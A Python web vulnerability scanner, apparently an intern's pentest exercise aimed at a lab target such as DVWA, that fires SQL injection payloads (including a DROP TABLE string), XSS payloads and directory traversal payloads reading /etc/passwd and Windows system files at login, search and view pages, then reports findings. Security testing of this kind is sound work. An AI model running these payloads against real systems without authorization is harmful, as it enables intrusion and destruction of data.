#!/usr/bin/env python3
"""
Web Application Penetration Testing Automation Script
Author: Cybersecurity Intern
Purpose: Automated web vulnerability scanning and basic exploitation
"""

import requests
import re
import sys
import time
from urllib.parse import urljoin, urlparse
from datetime import datetime

class WebVulnerabilityTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
        
    def banner(self):
        print("=" * 50)
        print("    Web Application Vulnerability Tester")
        print("=" * 50)
        print(f"Target: {self.target_url}")
        print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 50)
    
    def test_sql_injection(self, url, params):
        """Test for SQL injection vulnerabilities"""
        print(f"[+] Testing SQL Injection on {url}")
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT null,null,null--",
            "'; DROP TABLE users--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
        ]
        
        vulnerable = False
        for payload in sql_payloads:
            test_params = params.copy()
            for param in test_params:
                test_params[param] = payload
                
            try:
                response = self.session.post(url, data=test_params, timeout=10)
                
                # Check for SQL error messages
                sql_errors = [
                    "mysql_fetch_array",
                    "ORA-[0-9]{5}",
                    "Microsoft OLE DB Provider",
                    "PostgreSQL query failed",
                    "Warning: pg_connect()",
                    "valid MySQL result",
                    "MySqlClient."
                ]
                
                for error in sql_errors:
                    if re.search(error, response.text, re.IGNORECASE):
                        self.vulnerabilities.append({
                            'type': 'SQL Injection',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': error,
                            'risk': 'High'
                        })
                        vulnerable = True
                        print(f"    [!] SQL Injection found in parameter '{param}' with payload: {payload}")
                        break
                        
            except requests.RequestException as e:
                print(f"    [!] Error testing {url}: {e}")
                
        if not vulnerable:
            print("    [-] No SQL injection vulnerabilities detected")
    
    def test_xss(self, url, params):
        """Test for Cross-Site Scripting vulnerabilities"""
        print(f"[+] Testing XSS on {url}")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        vulnerable = False
        for payload in xss_payloads:
            test_params = params.copy()
            for param in test_params:
                test_params[param] = payload
                
            try:
                response = self.session.post(url, data=test_params, timeout=10)
                
                if payload in response.text:
                    self.vulnerabilities.append({
                        'type': 'Cross-Site Scripting (XSS)',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': 'Payload reflected in response',
                        'risk': 'Medium'
                    })
                    vulnerable = True
                    print(f"    [!] XSS found in parameter '{param}' with payload: {payload}")
                    
            except requests.RequestException as e:
                print(f"    [!] Error testing {url}: {e}")
                
        if not vulnerable:
            print("    [-] No XSS vulnerabilities detected")
    
    def test_csrf(self, url):
        """Test for CSRF vulnerabilities"""
        print(f"[+] Testing CSRF protection on {url}")
        
        try:
            response = self.session.get(url, timeout=10)
            
            # Check for CSRF tokens
            csrf_patterns = [
                r'<input[^>]*name=["\']csrf[_token]*["\'][^>]*>',
                r'<input[^>]*name=["\']_token["\'][^>]*>',
                r'<meta[^>]*name=["\']csrf-token["\'][^>]*>'
            ]
            
            has_csrf_protection = False
            for pattern in csrf_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    has_csrf_protection = True
                    break
            
            if not has_csrf_protection:
                self.vulnerabilities.append({
                    'type': 'Cross-Site Request Forgery (CSRF)',
                    'url': url,
                    'parameter': 'N/A',
                    'payload': 'N/A',
                    'evidence': 'No CSRF token found in form',
                    'risk': 'Medium'
                })
                print("    [!] CSRF vulnerability detected - No protection mechanism found")
            else:
                print("    [-] CSRF protection appears to be implemented")
                
        except requests.RequestException as e:
            print(f"    [!] Error testing {url}: {e}")
    
    def directory_traversal_test(self, url):
        """Test for directory traversal vulnerabilities"""
        print(f"[+] Testing Directory Traversal on {url}")
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        vulnerable = False
        for payload in traversal_payloads:
            test_url = f"{url}?file={payload}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                if "root:" in response.text or "[boot loader]" in response.text:
                    self.vulnerabilities.append({
                        'type': 'Directory Traversal',
                        'url': test_url,
                        'parameter': 'file',
                        'payload': payload,
                        'evidence': 'System files accessed',
                        'risk': 'High'
                    })
                    vulnerable = True
                    print(f"    [!] Directory traversal found with payload: {payload}")
                    
            except requests.RequestException as e:
                continue
                
        if not vulnerable:
            print("    [-] No directory traversal vulnerabilities detected")
    
    def generate_report(self):
        """Generate vulnerability report"""
        print("\n" + "=" * 50)
        print("           VULNERABILITY REPORT")
        print("=" * 50)
        
        if not self.vulnerabilities:
            print("No vulnerabilities detected!")
            return
        
        risk_counts = {'High': 0, 'Medium': 0, 'Low': 0}
        
        for vuln in self.vulnerabilities:
            risk_counts[vuln['risk']] += 1
            print(f"\n[{vuln['risk'].upper()}] {vuln['type']}")
            print(f"URL: {vuln['url']}")
            print(f"Parameter: {vuln['parameter']}")
            print(f"Payload: {vuln['payload']}")
            print(f"Evidence: {vuln['evidence']}")
            print("-" * 40)
        
        print(f"\nSUMMARY:")
        print(f"High Risk: {risk_counts['High']}")
        print(f"Medium Risk: {risk_counts['Medium']}")
        print(f"Low Risk: {risk_counts['Low']}")
        print(f"Total Vulnerabilities: {len(self.vulnerabilities)}")
    
    def run_tests(self):
        """Run all vulnerability tests"""
        self.banner()
        
        # Test common login form
        login_params = {'username': 'admin', 'password': 'password'}
        login_url = urljoin(self.target_url, '/login.php')
        
        self.test_sql_injection(login_url, login_params)
        self.test_xss(login_url, login_params)
        self.test_csrf(login_url)
        
        # Test search functionality
        search_params = {'search': 'test'}
        search_url = urljoin(self.target_url, '/search.php')
        
        self.test_xss(search_url, search_params)
        
        # Test file inclusion
        self.directory_traversal_test(urljoin(self.target_url, '/view.php'))
        
        self.generate_report()

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 web_vulnerability_tester.py <target_url>")
        print("Example: python3 web_vulnerability_tester.py http://localhost/dvwa")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # Validate URL
    if not target_url.startswith(('http://', 'https://')):
        print("Error: Please provide a valid URL starting with http:// or https://")
        sys.exit(1)
    
    tester = WebVulnerabilityTester(target_url)
    tester.run_tests()

if __name__ == "__main__":
    main()
